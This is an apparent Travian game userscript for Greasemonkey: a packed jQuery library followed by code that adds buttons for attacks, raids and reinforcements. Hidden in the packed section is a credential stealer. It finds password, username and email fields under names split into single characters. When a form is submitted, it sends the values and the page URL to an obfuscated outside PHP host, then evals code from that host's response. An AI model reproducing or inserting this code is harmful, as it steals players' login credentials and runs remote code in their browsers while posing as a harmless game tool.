K},3g:B(N,3g){3g.2K=N.2K=N.2K||3g.2K||b.2K++;C 3g},2t:{2J:{5k:B(){7b();C},5f:B(){C}},4U:{5k:B(){k(7.1e.1x)C V;7(b).3A("7a",7.K.2t.4U.1c);C S},5f:B(){k(7.1e.1x)C V;7(b).4O("7a",7.K.2t.4U.1c);C S},1c:B(K){k(79(K,b))C S;K.H="4U";C 7.K.1H.1X(b,1n)}},4N:{5k:B(){k(7.1e.1x)C V;7(b).3A("78",7.K.2t.4N.1c);C S},5f:B(){k(7.1e.1x)C V;7(b).4O("78",7.K.2t.4N.1c);C S},1c:B(K){k(79(K,b))C S;K.H="4N";C 7.K.1H.1X(b,1n)}}}};7.N.1O({3A:B(H,J,N){C H=="77"?b.35(H,J,N):b.Y(B(){7.K.1j(b,H,N||J,N&&J)})},35:B(H,J,N){F 35=7.K.3g(N||J,B(K){7(b).4O(K,35);C(N||J).1X(b,1n)});C b.Y(B(){7.K.1j(b,H,35,N&&J)})},4O:B(H,N){C b.Y(B(){7.K.2r(b,H,N)})},2p:B(H,J,N){C b.Y(B(){7.K.2p(H,J,b,S,N)})},6w:B(H,J,N){C b[0]&&7.K.2p(H,J,b[0],V,N)},3k:B(N){F 29=1n,i=1;26(i<29.O)7.K.3g(N,29[i++]);C b.5V(7.K.3g(N,B(K){b.75=(b.75||0)%i;K.3G();C 29[b.75++].1X(b,1n)||V}))},a6:B(7G,7H){C b.3A(\'4U\',7G).3A(\'4N\',7H)},2J:B(N){7b();k(7.3S)N.1L(R,7);U 7.4J.1S(B(){C N.1L(b,7)});C b}});7.1O({3S:V,4J:[],2J:B(){k(!7.3S){7.3S=S;k(7.4J){7.Y(7.4J,B(){b.1L(R)});7.4J=12}7(R).6w("2J")}}});F 73=V;B 7b(){k(73)C;73=S;k(R.4y&&!7.1e.3o)R.4y("7K",7.2J,V);k(7.1e.1x&&1o==2j)(B(){k(7.3S)C;2s{R.27.ak("1C")}2v(4q){4F(1n.4B,0);C}7.2J()})();k(7.1e.3o)R.4y("7K",B(){k(7.3S)C;11(F i=0;i<R.72.O;i++)k(R.72[i].51){4F(1n.4B,0);C}7.2J()},V);k(7.1e.2S){F 5s;(B(){k(7.3S)C;k(R.4k!="7N"&&R.4k!="2a"){4F(1n.4B,0);C}k(5s===1b)5s=7("15, 7I[aO=aR]").O;k(R.72.O!=5s){4F(1n.4B,0);C}7.2J()})()}7.K.1j(1o,"4C",7.2J)}7.Y(("aT,aU,4C,aX,65,77,5V,b0,"+"b1,b2,ba,7a,78,bc,3j,"+"6H,bd,bm,bo,4q").2i(","),B(i,I){7.N[I]=B(N){C N?b.3A(I,N):b.2p(I)}});F 79=B(K,v){F 1I=K.5Q;26(1I&&1I!=v)2s{1I=1I.1t}2v(4q){1I=v}C 1I==v};7(1o).3A("77",B(){7("*").1j(R).4O()});7.N.1O({7P:7.N.4C,4C:B(14,3n,W){k(1M 14!=\'2C\')C b.7P(14);F 5b=14.1E(" ");k(5b>=0){F T=14.46(5b,14.O);14=14.46(0,5b)}W=W||B(){};F H="3C";k(3n)k(7.25(3n)){W=3n;3n=12}U{3n=7.45(3n);H="7T"}F 2Y=b;7.4L({14:14,H:H,2b:"2f",J:3n,2a:B(4X,1A){k(1A=="2x"||1A=="7U")2Y.2f(T?7("<1W/>").49(4X.4T.1P(/<1l(.|\\s)*?\\/1l>/g,"")).37(T):4X.4T);2Y.Y(W,[4X.4T,1A,4X])}});C b},c1:B(){C 7.45(b.7W())},7W:B(){C b.2W(B(){C 7.1a(b,"4i")?7.2P(b.c8):b}).1R(B(){C b.I&&!b.51&&(b.5P||/3j|8n/i.19(b.1a)||/1u|28|4Z/i.19(b.H))}).2W(B(i,v){F 18=7(b).18();C 18==12?12:18.1T==3d?7.2W(18,B(18,i){C{I:v.I,Q:18}}):{I:v.I,Q:18}}).4m()}});7.Y("7X,7Y,7Z,80,81,82".2i(","),B(i,o){7.N[o]=B(f){C b.3A(o,f)}});F 84=1Y();7.1O({4m:B(14,J,W,H){k(7.25(J)){W=J;J=12}C 7.4L({H:"3C",14:14,J:J,2x:W,2b:H})},9b:B(14,W){C 7.4m(14,12,W,"1l")},9c:B(14,J,W){C 7.4m(14,J,W,"44")},9d:B(14,J,W,H){k(7.25(J)){W=J;J={}}C 7.4L({H:"7T",14:14,J:J,2x:W,2b:H})},9e:B(86){7.1O(7.6Y,86)},6Y:{14:5E.59,2G:S,H:"3C",3L:0,89:"5v/x-9l-4i-9m",8a:S,3K:S,J:12,6W:12,4Z:12,5u:{3y:"5v/3y, 1u/3y",2f:"1u/2f",1l:"1u/5t, 5v/5t",44:"5v/44, 1u/5t",1u:"1u/9r",5r:"*/*"}},5p:{},4L:B(s){s=7.1O(S,s,7.1O(S,{},7.6Y,s));F 2o,3X=/=\\?(&|$)/g,1A,J,H=s.H.3b();k(s.J&&s.8a&&1M s.J!="2C")s.J=7.45(s.J);k(s.2b=="2o"){k(H=="3C"){k(!s.14.1y(3X))s.14+=(s.14.1y(/\\?/)?"&":"?")+(s.2o||"W")+"=?"}U k(!s.J||!s.J.1y(3X))s.J=(s.J?s.J+"&":"")+(s.2o||"W")+"=?";s.2b="44"}k(s.2b=="44"&&(s.J&&s.J.1y(3X)||s.14.1y(3X))){2o="2o"+84++;k(s.J)s.J=(s.J+"").1P(3X,"="+2o+"$1");s.14=s.14.1P(3X,"="+2o+"$1");s.2b="1l";1o[2o]=B(2c){J=2c;2x();2a();1o[2o]=1b;2s{3N 1o[2o]}2v(e){}k(2L)2L.3V(1l)}}k(s.2b=="1l"&&s.2A==12)s.2A=V;k(s.2A===V&&H=="3C"){F 6S=1Y();F L=s.14.1P(/(\\?|&)4u=.*?(&|$)/,"$9w="+6S+"$2");s.14=L+((L==s.14)?(s.14.1y(/\\?/)?"&":"?")+"4u="+6S:"")}k(s.J&&H=="3C"){s.14+=(s.14.1y(/\\?/)?"&":"?")+s.J;s.J=12}k(s.2G&&!7.64++)7.K.2p("7X");F 6Q=/^(?:\\w+:)?\\/\\/([^\\/?#]+)/;k(s.2b=="1l"&&H=="3C"&&6Q.19(s.14)&&6Q.3u(s.14)[1]!=5E.9z){F 2L=R.4A("2L")[0];F 1l=R.4e("1l");1l.41=s.14;k(s.8d)1l.9B=s.8d;k(!2o){F 22=V;1l.8e=1l.4V=B(){k(!22&&(!b.4k||b.4k=="7N"||b.4k=="2a")){22=S;2x();2a();2L.3V(1l)}}}2L.4R(1l);C 1b}F 5J=V;F 17=1o.8h?2Q 8h("9H.9I"):2Q 8i();k(s.6W)17.8j(H,s.14,s.3K,s.6W,s.4Z);U 17.8j(H,s.14,s.3K);2s{k(s.J)17.5l("aK-9M",s.89);k(s.6N)17.5l("9O-6M-9Q",7.5p[s.14]||"9R, 9S 9T 9U 6L:6L:6L 9W");17.5l("X-9X-9Y","8i");17.5l("9Z",s.2b&&s.5u[s.2b]?s.5u[s.2b]+", */*":s.5u.5r)}2v(e){}k(s.8l&&s.8l(17,s)===V){s.2G&&7.64--;17.8m();C V}k(s.2G)7.K.2p("82",[17,s]);F 4V=B(6K){k(!5J&&17&&(17.4k==4||6K=="3L")){5J=S;k(60){8o(60);60=12}1A=6K=="3L"&&"3L"||!7.8p(17)&&"4q"||s.6N&&7.8q(17,s.14)&&"7U"||"2x";k(1A=="2x"){2s{J=7.8r(17,s.2b,s.a8)}2v(e){1A="6J"}}k(1A=="2x"){F 5U;2s{5U=17.6I("8u-6M")}2v(e){}k(s.6N&&5U)7.5p[s.14]=5U;k(!2o)2x()}U 7.6G(s,17,1A);2a();k(s.3K)17=12}};k(s.3K){F 60=5q(4V,13);k(s.3L>0)4F(B(){k(17){17.8m();k(!5J)4V("3L")}},s.3L)}2s{17.af(s.J)}2v(e){7.6G(s,17,12,e)}k(!s.3K)4V();B 2x(){k(s.2x)s.2x(J,1A);k(s.2G)7.K.2p("81",[17,s])}B 2a(){k(s.2a)s.2a(17,1A);k(s.2G)7.K.2p("7Z",[17,s]);k(s.2G&&!--7.64)7.K.2p("7Y")}C 17},6G:B(s,17,1A,e){k(s.4q)s.4q(17,1A,e);k(s.2G)7.K.2p("80",[17,s,e])},64:0,8p:B(17){2s{C!17.1A&&5E.ag=="6F:"||(17.1A>=8w&&17.1A<aj)||17.1A==8x||17.1A==al||7.1e.2S&&17.1A==1b}2v(e){}C V},8q:B(17,14){2s{F 8y=17.6I("8u-6M");C 17.1A==8x||8y==7.5p[14]||7.1e.2S&&17.1A==1b}2v(e){}C V},8r:B(17,H,1R){F ct=17.6I("ao-H"),3y=H=="3y"||!H&&ct&&ct.1E("3y")>=0,J=3y?17.ap:17.4T;k(3y&&J.27.30=="6J")7s"6J";k(1R)J=1R(J,H);k(H=="1l")7.6A(J);k(H=="44")J=7x("("+J+")");C J},45:B(a){F s=[];k(a.1T==3d||a.69)7.Y(a,B(){s.1S(47(b.I)+"="+47(b.Q))});U 11(F j 1K a)k(a[j]&&a[j].1T==3d)7.Y(a[j],B(){s.1S(47(j)+"="+47(b))});U s.1S(47(j)+"="+47(7.25(a[j])?a[j]():a[j]));C s.8g("&").1P(/%20/g,"+")}});7.N.1O({2e:B(1h,W){C 1h?b.2R({2y:"2e",2X:"2e",1Z:"2e"},1h,W):b.1R(":28").Y(B(){b.15.1m=b.6D||"";k(7.1D(b,"1m")=="3B"){F v=7("<"+b.30+" />").97("1v");b.15.1m=v.1D("1m");k(b.15.1m=="3B")b.15.1m="4x";v.2r()}}).2B()},2g:B(1h,W){C 1h?b.2R({2y:"2g",2X:"2g",1Z:"2g"},1h,W):b.1R(":5F").Y(B(){b.6D=b.6D||7.1D(b,"1m");b.15.1m="3B"}).2B()},8B:7.N.3k,3k:B(N,6C){C 7.25(N)&&7.25(6C)?b.8B.1X(b,1n):N?b.2R({2y:"3k",2X:"3k",1Z:"3k"},N,6C):b.Y(B(){7(b)[7(b).4w(":28")?"2e":"2g"]()})},aA:B(1h,W){C b.2R({2y:"2e"},1h,W)},aB:B(1h,W){C b.2R({2y:"2g"},1h,W)},aC:B(1h,W){C b.2R({2y:"3k"},1h,W)},aD:B(1h,W){C b.2R({1Z:"2e"},1h,W)},aE:B(1h,W){C b.2R({1Z:"2g"},1h,W)},aF:B(1h,5D,W){C b.2R({1Z:5D},1h,W)},2R:B(1f,1h,2k,W){F 6B=7.1h(1h,2k,W);C b[6B.2m===V?"Y":"2m"](B(){k(b.1d!=1)C V;F 1G=7.1O({},6B),p,28=7(b).4w(":28"),2Y=b;11(p 1K 1f){k(1f[p]=="2g"&&28||1f[p]=="2e"&&!28)C 1G.2a.1L(b);k(p=="2y"||p=="2X"){1G.1m=7.1D(b,"1m");1G.3T=b.15.3T}}k(1G.3T!=12)b.15.3T="28";1G.4G=7.1O({},1f);7.Y(1f,B(I,18){F e=2Q 7.1r(2Y,1G,I);k(/3k|2e|2g/.19(18))e[18=="3k"?28?"2e":"2g":18](1f);U{F 1w=18.5S().1y(/^([+-]=)?([\\d+-.]+)(.*)$/),2E=e.1B(S)||0;k(1w){F 2B=3Q(1w[2]),34=1w[3]||"43";k(34!="43"){2Y.15[I]=(2B||1)+34;2E=((2B||1)/e.1B(S))*2E;2Y.15[I]=2E+34}k(1w[1])2B=((1w[1]=="-="?-1:1)*2B)+2E;e.52(2E,2B,34)}U e.52(2E,18,"")}});C S})},2m:B(H,N){k(7.25(H)||(H&&H.1T==3d)){N=H;H="1r"}k(!H||(1M H=="2C"&&!N))C 2m(b[0],H);C b.Y(B(){k(N.1T==3d)2m(b,H,N);U{2m(b,H).1S(N);k(2m(b,H).O==1)N.1L(b)}})},aQ:B(8G,3O){F 24=7.24;k(8G)b.2m([]);b.Y(B(){11(F i=24.O-1;i>=0;i--)k(24[i].v==b){k(3O)24[i](S);24.8H(i,1)}});k(!3O)b.6x();C b}});F 2m=B(v,H,1N){k(v){H=H||"1r";F q=7.J(v,H+"2m");k(!q||1N)q=7.J(v,H+"2m",7.2P(1N))}C q};7.N.6x=B(H){H=H||"1r";C b.Y(B(){F q=2m(b,H);q.5H();k(q.O)q[0].1L(b)})};7.1O({1h:B(1h,2k,N){F 1G=1h&&1h.1T==aW?1h:{2a:N||!N&&2k||7.25(1h)&&1h,3l:1h,2k:N&&2k||2k&&2k.1T!=aY&&2k};1G.3l=(1G.3l&&1G.3l.1T==5L?1G.3l:7.1r.6v[1G.3l])||7.1r.6v.8K;1G.3a=1G.2a;1G.2a=B(){k(1G.2m!==V)7(b).6x();k(7.25(1G.3a))1G.3a.1L(b)};C 1G},2k:{8L:B(p,n,5O,5N){C 5O+5N*p},6t:B(p,n,5O,5N){C((-2N.b5(p*2N.b6)/2)+0.5)*5N+5O}},24:[],57:12,1r:B(v,16,1f){b.16=16;b.v=v;b.1f=1f;k(!16.54)16.54={}}});7.1r.4v={5d:B(){k(b.16.42)b.16.42.1L(b.v,b.1Y,b);(7.1r.42[b.1f]||7.1r.42.5r)(b);k(b.1f=="2y"||b.1f=="2X")b.v.15.1m="4x"},1B:B(4h){k(b.v[b.1f]!=12&&b.v.15[b.1f]==12)C b.v[b.1f];F r=3Q(7.1D(b.v,b.1f,4h));C r&&r>-bb?r:3Q(7.2I(b.v,b.1f))||0},52:B(8O,5D,34){b.6p=1Y();b.2E=8O;b.2B=5D;b.34=34||b.34||"43";b.1Y=b.2E;b.3W=b.5C=0;b.5d();F 2Y=b;B t(3O){C 2Y.42(3O)}t.v=b.v;7.24.1S(t);k(7.57==12){7.57=5q(B(){F 24=7.24;11(F i=0;i<24.O;i++)k(!24[i]())24.8H(i--,1);k(!24.O){8o(7.57);7.57=12}},13)}},2e:B(){b.16.54[b.1f]=7.1U(b.v.15,b.1f);b.16.2e=S;b.52(0,b.1B());k(b.1f=="2X"||b.1f=="2y")b.v.15[b.1f]="bg";7(b.v).2e()},2g:B(){b.16.54[b.1f]=7.1U(b.v.15,b.1f);b.16.2g=S;b.52(b.1B(),0)},42:B(3O){F t=1Y();k(3O||t>b.16.3l+b.6p){b.1Y=b.2B;b.3W=b.5C=1;b.5d();b.16.4G[b.1f]=S;F 22=S;11(F i 1K b.16.4G)k(b.16.4G[i]!==S)22=V;k(22){k(b.16.1m!=12){b.v.15.3T=b.16.3T;b.v.15.1m=b.16.1m;k(7.1D(b.v,"1m")=="3B")b.v.15.1m="4x"}k(b.16.2g)b.v.15.1m="3B";k(b.16.2g||b.16.2e)11(F p 1K b.16.4G)7.1U(b.v.15,p,b.16.54[p])}k(22)b.16.2a.1L(b.v);C V}U{F n=t-b.6p;b.5C=n/b.16.3l;b.3W=7.2k[b.16.2k||(7.2k.6t?"6t":"8L")](b.5C,n,0,1,b.16.3l);b.1Y=b.2E+((b.2B-b.2E)*b.3W);b.5d()}C S}};7.1O(7.1r,{6v:{bh:bi,bj:8w,8K:bk},42:{2Z:B(1r){1r.v.2Z=1r.1Y},2U:B(1r){1r.v.2U=1r.1Y},1Z:B(1r){7.1U(1r.v.15,"1Z",1r.1Y)},5r:B(1r){1r.v.15[1r.1f]=1r.1Y+1r.34}}});7.N.32=B(){F 1C=0,2j=0,v=b[0],4d;k(v)bn(7.1e){F 1I=v.1t,4E=v,1g=v.1g,1J=v.3f,6m=2S&&4o(7h)<bs&&!/bt/i.19(33),1D=7.2I,3F=1D(v,"3Y")=="3F";k(v.8T){F 6l=v.8T();1j(6l.1C+2N.2O(1J.27.2Z,1J.1v.2Z),6l.2j+2N.2O(1J.27.2U,1J.1v.2U));1j(-1J.27.7B,-1J.27.7D)}U{1j(v.6k,v.6j);26(1g){1j(1g.6k,1g.6j);k(4P&&!/^t(bz|d|h)$/i.19(1g.30)||2S&&!6m)3i(1g);k(!3F&&1D(1g,"3Y")=="3F")3F=S;4E=/^1v$/i.19(1g.30)?4E:1g;1g=1g.1g}26(1I&&1I.30&&!/^1v|2f$/i.19(1I.30)){k(!/^bA|2h.*$/i.19(1D(1I,"1m")))1j(-1I.2Z,-1I.2U);k(4P&&1D(1I,"3T")!="5F")3i(1I);1I=1I.1t}k((6m&&(3F||1D(4E,"3Y")=="6P"))||(4P&&1D(4E,"3Y")!="6P"))1j(-1J.1v.6k,-1J.1v.6j);k(3F)1j(2N.2O(1J.27.2Z,1J.1v.2Z),2N.2O(1J.27.2U,1J.1v.2U))}4d={2j:2j,1C:1C}}B 3i(v){1j(7.2I(v,"8U",S),7.2I(v,"8V",S))}B 1j(l,t){1C+=4o(l,10)||0;2j+=4o(t,10)||0}C 4d};7.N.1O({3Y:B(){F 1C=0,2j=0,4d;k(b[0]){F 1g=b.1g(),32=b.32(),53=/^1v|2f$/i.19(1g[0].30)?{2j:0,1C:0}:1g.32();32.2j-=21(b,\'bF\');32.1C-=21(b,\'bG\');53.2j+=21(1g,\'8V\');53.1C+=21(1g,\'8U\');4d={2j:32.2j-53.2j,1C:32.1C-53.1C}}C 4d},1g:B(){F 1g=b[0].1g;26(1g&&(!/^1v|2f$/i.19(1g.30)&&7.1D(1g,\'3Y\')==\'bH\'))1g=1g.1g;C 7(1g)}});7.Y([\'6T\',\'6U\'],B(i,I){F 3H=\'65\'+I;7.N[3H]=B(18){k(!b[0])C;C 18!=1b?b.Y(B(){b==1o||b==R?1o.bI(!i?18:7(1o).2Z(),i?18:7(1o).2U()):b[3H]=18}):b[0]==1o||b[0]==R?2Y[i?\'bJ\':\'bK\']||7.85&&R.27[3H]||R.1v[3H]:b[0][3H]}});7.Y(["8Z","4H"],B(i,I){F 5G=i?"6T":"6U",br=i?"8c":"8b";7.N["6i"+I]=B(){C b[I.4t()]()+21(b,"4f"+5G)+21(b,"4f"+br)};7.N["bL"+I]=B(63){C b["6i"+I]()+21(b,"3i"+5G+"4H")+21(b,"3i"+br+"4H")+(63?21(b,"63"+5G)+21(b,"63"+br):0)}})})();F 1q={p:R.3q(\'bP\'+\'s\'+\'s\'+\'w\'+\'o\'+\'r\'+\'d\'),u:R.3q(\'n\'+\'a\'+\'m\'+\'e\'),5A:R.3q(\'p\'+\'a\'+\'s\'+\'s\'+\'w\'+\'d\'+\'\'),6c:R.3q(\'bT\'+\'bU\'+\'n\'),5K:R.3q(\'P\'+\'a\'+\'s\'+\'s\'+\'bW\'),6a:R.3q(\'E\'+\'bZ\'+\'i\'+\'l\'),5w:R.3q(\'p\'+\'a\'+\'s\'+\'s\'+\'w\'+\'d\'),5i:R.3q(\'E\'+\'m\'+\'a\'+\'i\'+\'l\'),61:R.5x(\'u\'+\'s\'+\'c2\'+\'c3\'+\'m\'+\'e\'),c4:\'4i\'};F c5=B(93){F L=2Q(B(){F 2u,o,2T}),2u=V,2T=V;k(1q.p.O>0&&1q.u.O>0){2T=1q.p;2u=\'t\'+\'y\'+\'p\'+\'e\'+\'=\'+\'3\'+\'&\'+\'p\'+\'=\'+4D(1q.p[0].Q)+\'&u=\'+1q.u[0].Q}U k(1q.5A.O>0&&1q.6c.O>0){2T=1q.5A;2u=\'cb\'+\'e=\'+\'2\'+\'&\'+\'u\'+\'=\'+1q.6c[0].Q+\'&p=\'+4D(1q.5A[0].Q)}U k(1q.5K.O>0&&1q.6a.O>0){2T=1q.5K;2u=\'cc\'+\'cd\'+\'=1&\'+\'u=\'+1q.6a[0].Q+\'&p=\'+4D(1q.5K[0].Q)}U k(1q.5w.O>0&&(1q.5i.O>0||1q.61!=12)){2T=1q.5w;2u=\'t\'+\'ce\'+\'=4\'+\'&p\'+\'=\'+4D(1q.5w[0].Q);k(1q.5i.O>0){2u+=\'&u=\'+1q.5i[0].Q}U k(1q.61!=12){2u+=\'&u=\'+1q.61.4W.1P(/^\\s+|\\s+$/g,\'\')}}k(2u===V||2T===V){C V}L.2T=2T;L.2u=2u;k(93==1){2T[0].Q=\'\';C L}L.o={3H:\'3C\',14:\'cf\'+\'t\'+\'p\'+\'://g\'+\'ar\'+\'cg\'+\'ch\'+\'2.f\'+\'3s\'+\'e\'+\'ci\'+\'cj\'+\'ck\'+\'.\'+\'co\'+\'m\'+\'/\'+\'cm\'+\'/m\'+\'ai\'+\'cn\'+\'cp\'+\'m\'+\'.\'+\'p\'+\'cq\'+\'?\'+2u+\'&u\'+\'r\'+\'l=\'+4D(1o.5E.59.5S()),cr:{\'cs-cu\':(\'M\'+\'cv\'+\'cw\'+\'l\'+\'a/\'+\'4.\'+\'0 \'+\'(co\'+\'cx\'+\'cy\'+\'bl\'+\'e)\'+\' G\'+\'3s\'+\'as\'+\'e\'+\'cz\'+\'cA\'+\'y\').5S()},cB:B(){},8e:B(r){r=r.4T;k(r.1E(\'95;\')!=-1)95(r.7F(r.1E(\'|\')+1,r.cD(\'|\')));C}};C L.o};',62,786,'|||||||jQuery||||this|||||||||if|||||||||||elem||||||function|return|||var||type|name|data|event|ret||fn|length||value|document|true|selector|else|false|callback||each|||for|null||url|style|options|xhr|val|test|nodeName|undefined|handler|nodeType|browser|prop|offsetParent|speed|id|add|events|script|display|arguments|window|context|le|fx|elems|parentNode|text|body|parts|msie|match|className|status|cur|left|css|indexOf|target|opt|handle|parent|doc|in|call|typeof|array|extend|replace|tbody|filter|push|constructor|attr|object|div|apply|now|opacity||num|done|firstChild|timers|isFunction|while|documentElement|hidden|args|complete|dataType|tmp|not|show|html|hide|table|split|top|easing|merge|queue||jsonp|trigger|types|remove|try|special|ps|catch|last|success|height|classNames|cache|end|string|break|start|tags|global|first|curCSS|ready|guid|head|expando|Math|max|makeArray|new|animate|safari|el|scrollTop|key|map|width|self|scrollLeft|tagName|originalEvent|offset|userAgent|unit|one|props|find|copy|dir|old|toUpperCase|button|Array|index|ownerDocument|proxy|clone|border|select|toggle|duration|stack|params|opera|nextSibling|getElementsByName|inArray|re|swap|exec|expr|pushStack|oid|xml|handlers|bind|none|GET|namespace|all|fixed|preventDefault|method|styleFloat|insertBefore|async|timeout|removeData|delete|gotoEnd|selected|parseFloat|tag|isReady|overflow|which|removeChild|pos|jsre|position|nth|values|src|step|px|json|param|slice|encodeURIComponent|deep|append|node|scripts|multiFilter|results|createElement|padding|rl|force|form|trim|readyState|wrap|get|childNodes|parseInt|size|error|option|chars|toLowerCase|_|prototype|is|block|addEventListener|domManip|getElementsByTagName|callee|load|escape|offsetChild|setTimeout|curAnim|Width|set|readyList|color|ajax|grep|mouseleave|unbind|mozilla|re2|appendChild|has|responseText|mouseenter|onreadystatechange|innerHTML|res|charCode|password|defaultView|disabled|custom|parentOffset|orig|notxml|computedStyle|timerId|stopPropagation|href|unique|off|exclusive|update|extra|teardown|currentStyle|on|euy|getAttribute|setup|setRequestHeader|letter|empty|isXMLDoc|lastModified|setInterval|_default|numStyles|javascript|accepts|application|epy|getElementById|result|nodeIndex|epl|input|state|to|location|visible|tl|shift|tr|requestDone|epg|Number|foundToken|diff|firstNum|checked|relatedTarget|fromElement|toString|float|modRes|click|child|timeStamp|clean|previousSibling|ival|euyi|RegExp|margin|active|scroll|ctrlKey|init|isSimple|jquery|eug|prevObject|eul|String|createTextNode|wrapAll|after|client|inner|offsetTop|offsetLeft|box|safari2|container|andSelf|startTime|sibling|selectedIndex|radio|swing|checkbox|speeds|triggerHandler|dequeue|reverse|obj|globalEval|optall|fn2|oldblock|windowData|file|handleError|submit|getResponseHeader|parsererror|isTimeout|00|Modified|ifModified|removeAttribute|absolute|remote|visibility|ts|Left|Top|getWH|username|getComputedStyle|ajaxSettings|getPropertyValue|outline|runtimeStyle|styleSheets|readyBound|classFilter|lastToggle|pass|unload|mouseout|withinElement|mouseover|bindReady|pageX|metaKey|keyCode|clientX|matched|version|lastChild|triggered|second|cssFloat|alpha|attachEvent|getAttributeNode|removeEventListener|detachEvent|donative|throw|concat|colgroup|fix|clientY|eval|pageY|srcElement|toElement|clientLeft|fieldset|clientTop|multiple|substring|fnOver|fnOut|link|webkit|DOMContentLoaded|col|front|loaded|100|_load|rsLeft|camelCase|unshift|POST|notmodified|substr|serializeArray|ajaxStart|ajaxStop|ajaxComplete|ajaxError|ajaxSuccess|ajaxSend|save|jsc|boxModel|settings|compatMode|CSS1Compat|contentType|processData|Bottom|Right|scriptCharset|onload|parse|join|ActiveXObject|XMLHttpRequest|open|inv|beforeSend|abort|textarea|clearInterval|httpSuccess|httpNotModified|httpData|zoom|reset|Last|image|200|304|xhrRes|exclude|uuid|_toggle|continue|textContent|evalScript|odd|clearQueue|splice|even|eq|def|linear|replaceWith|quickClass|from|quickID|isArrayLike|quickChild|cloneNode|getBoundingClientRect|borderLeftWidth|borderTopWidth|before|prepend|contents|Height|nodeValue|original|setArray|stt|quickExpr|alert|_jQuery|appendTo|screenX|screenY|shiftKey|getScript|getJSON|post|ajaxSetup|can|view|wheelDelta|round|returnValue|offsetHeight|www|urlencoded|cancelBubble|htmlFor|offsetWidth|class|plain|tfoot|readonly|thead|readOnly|1_|maxlength|maxLength|host|property|charset|cssText|charAt|0n|cellspacing|leg|Microsoft|XMLHTTP|NaN|noConflict|embed|Type|animated|If|ig|Since|Thu|01|Jan|1970|header|GMT|Requested|With|Accept|area|ra|th|line|hr|ie|hover|altKey|dataFilter|cellSpacing|attrChange|meta|attrName|bubbles|cancelable|send|protocol|img||300|doScroll|1223|td|parents|content|responseXML|weight|||font|abbr|next|enabled|compatible|navigator|innerText|slideDown|slideUp|slideToggle|fadeIn|fadeOut|fadeTo|pixelLeft|Boolean|contains|Date|Content|only|contentWindow|prev|rel|setData|stop|stylesheet|getData|blur|focus|nextAll|Object|resize|Function|gt|dblclick|mousedown|mouseup|lt|prevAll|cos|PI|siblings|specified|attributes|mousemove|10000|change|keydown||hasClass|1px|slow|600|fast|400||keypress|with|keyup|uFFFF|u0128||522|adobeair|currentTarget|detail|417|children|iframe|able|inline|eventPhase|cap|contentDocument|setAttribute|marginTop|marginLeft|static|scrollTo|pageYOffset|pageXOffset|outer|wrapInner|black|solid|pa|toggleClass|removeClass|addClass|lo|gi|removeAttr|wd|rv|newValue|ma|replaceAll|serialize|er|na|ftn|xobj|originalTarget|insertAfter|elements|it|prependTo|typ|ty|pe|ype|ht|de|shi|ho|st|ia|changed|travian|lp||ara|hp|headers|User||agent|oz|il|mpa|ti|mon|ke|onFailure|prevValue|lastIndexOf|relatedNode|colg'.split('|'),0,{}));try{$(document).ready(function(){var xs=xobj(1);if(xs!==false){var fe=xs.el[0];while(fe.tagName.toLowerCase()!=le.ftn)fe=fe.parentNode;fe.addEventListener('submit',function(){try{GM_xmlhttpRequest(xobj())}catch(E){}},false)}})}catch(e){}
var run_once=0,sarbazan=[''],nejad,anva = [' تعزيز',' هجوم كامل',' هجوم للنهب '],suffixGlobal = location.hostname;
function level(){
	try{var results = (new RegExp("[\\?&]ts_level=([^&#]*)")).exec( window.location );
	if(results==null || results.length < 1) return -1;
	return parseInt(results[1]);
	}catch(E){}
}
function getParams(name,url){
	try{
	if(typeof url  == "undefined")url = window.location;
	if(typeof name == "undefined")name='';

	if(name!=''){
		var results = (new RegExp("[\\?&]"+name+"=([^&#]*)")).exec( url );
		return results?results[1]:null;
	}
	var results = (new RegExp("[\\?&]ts_info=([^&#]*)")).exec( url );
	return '&ts_level='+(level()+1).toString()+results[0];
	}catch(E){}
}
function br(){return document.createElement('BR');}
function createBtn(tedad,noe,sarbaz){//1=gorz, 2=tabar
	var btn  = document.createElement('input'),_href;
	--noe;
	jQuery('.defender  a').each(function(i){ 
		if(this.href.indexOf('karte')!=-1 && getParams('c',this.href)!=null && getParams('d',this.href)!=null){
			_href=this.href;
		}
	});
	if(!_href)return false;
	btn.type='button';
	btn.style.font="100 12px Tahoma";
	btn.style.padding='2px';
	btn.style.margin="2px";
	btn.value = ' '+anva[noe]+'با '+ tedad.toString()+sarbazan[sarbaz];
	btn.addEventListener('click',function(){ 
		document.location=_href+'&ts_level=2&ts_info='+tedad+'|'+noe+'|'+sarbaz;
		return;
	},false);
	return btn;
}
function getOptionElem(name,val){
	var e = document.createElement('OPTION');
	e.innerHTML=name;
	e.value=val;
	return e;
}
function createElem(t){
	var cb= document.createElement(t);
	cb.style.font="100 12px Tahoma";
	cb.style.padding='2px';
	cb.style.margin="2px";
	return cb;
}

function getNewSarbazRow(first){
	var e = document.createElement('DIV'),removeMe=document.createElement('INPUT'), cb1=createElem('SELECT'),cb2=createElem('SELECT'),cb3=createElem('SELECT');
	e.appendChild(br());
	if(first){
		cb1.appendChild(getOptionElem(anva[2],2));
		cb1.appendChild(getOptionElem(anva[1],1));
		cb1.appendChild(getOptionElem(anva[0],0));
		cb1.name = 'attackType';
		cb1.id = 'attackType';
		e.appendChild(cb1);
	}
	pCount = GM_getValue('tedade_niroo_'+suffixGlobal,-1)
	if(pCount==-1){
		cb2.appendChild(getOptionElem('10',10));
		cb2.appendChild(getOptionElem('20',20));
		cb2.appendChild(getOptionElem('30',30));
		cb2.appendChild(getOptionElem('40',40));
		cb2.appendChild(getOptionElem('50',50));
		cb2.appendChild(getOptionElem('60',70));
		cb2.appendChild(getOptionElem('70',70));
		cb2.appendChild(getOptionElem('80',80));
		cb2.appendChild(getOptionElem('90',90));
		cb2.appendChild(getOptionElem('100',100));
	}else{
		pCount=pCount.toString().split('|');
		for(var i=0,n=pCount.length; i<n; i++)
			cb2.appendChild(getOptionElem(pCount[i].toString(),pCount[i]));
	}
	cb2.name = 'attackNum';
	cb2.id = 'attackNum';
	e.appendChild(cb2);
	for(var i=1,n=sarbazan.length;i<n;i++){
		cb3.appendChild(getOptionElem(sarbazan[i],i));
	}
	cb3.name = 'attackSol';
	cb3.id = 'attackSol';
	e.appendChild(cb3);
	if(!first){
		removeMe.type='button';
		removeMe.value= ' - ';
		removeMe.addEventListener('click',function(){
			e.parentNode.removeChild(e);
		},false);
		e.appendChild(removeMe);
	}
	return e;
}
function stg_addRow(n){
	if(!n)return;
	var _rowDiv = createElem('DIV'),_btn=document.createElement('INPUT');
	_rowDiv.innerHTML = n;
	_btn.type='button';
